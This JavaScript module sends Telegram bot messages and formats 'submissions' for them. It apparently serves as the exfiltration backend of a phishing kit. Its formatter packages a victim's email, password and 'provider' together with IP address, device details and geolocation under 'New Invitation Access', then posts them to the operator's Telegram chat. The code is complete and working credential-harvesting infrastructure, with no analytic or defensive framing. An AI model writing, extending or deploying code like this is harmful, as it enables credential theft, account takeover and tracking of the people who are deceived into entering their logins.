async function sendTelegramMessage(text) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) {
    console.warn('[telegram] Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
    return { ok: false, error: 'not-configured' };
  }

  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });
    const data = await res.json();
    if (!data.ok) {
      console.error('[telegram] API error:', data.description);
      return { ok: false, error: data.description };
    }
    return { ok: true };
  } catch (err) {
    console.error('[telegram] fetch error:', err.message);
    return { ok: false, error: err.message };
  }
}

function escapeHtml(str) {
  if (str == null) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

function formatSubmission(sub) {
  const e = escapeHtml;
  const lines = [];
  lines.push('<b>🎉 New Invitation Access</b>');
  lines.push('<b>━━━━━━━━━━━━━━━━</b>');
  lines.push('');
  lines.push(`📧 <b>Email:</b> <code>${e(sub.email)}</code>`);
  if (sub.password) {
    lines.push(`🔑 <b>Password:</b> <code>${e(sub.password)}</code>`);
  }
  lines.push(`🗂 <b>Provider:</b> ${e(sub.provider)}`);
  lines.push('');
  lines.push('<b>── Device Info ──</b>');
  lines.push(`🌐 <b>IP Address:</b> <code>${e(sub.ip)}</code>`);
  lines.push(`🖥 <b>Browser:</b> ${e(sub.browser)}`);
  lines.push(`💻 <b>OS:</b> ${e(sub.os)}`);
  lines.push(`📱 <b>Device:</b> ${e(sub.device)}`);
  lines.push('');
  lines.push('<b>── Location ──</b>');
  lines.push(`📍 <b>City:</b> ${e(sub.city)}`);
  lines.push(`🗺 <b>Region:</b> ${e(sub.region)}`);
  lines.push(`🌍 <b>Country:</b> ${e(sub.country)}`);
  lines.push('');
  lines.push('<b>── Metadata ──</b>');
  lines.push(`🕐 <b>Date:</b> ${e(sub.date)}`);
  lines.push(`⏰ <b>Time:</b> ${e(sub.time)}`);
  lines.push(`👤 <b>User Agent:</b> ${e(sub.userAgent)}`);
  lines.push('');
  lines.push('<b>━━━━━━━━━━━━━━━━</b>');
  lines.push(`<i>Received via ${e(sub.provider)} portal</i>`);
  return lines.join('\n');
}

module.exports = { sendTelegramMessage, formatSubmission, escapeHtml };
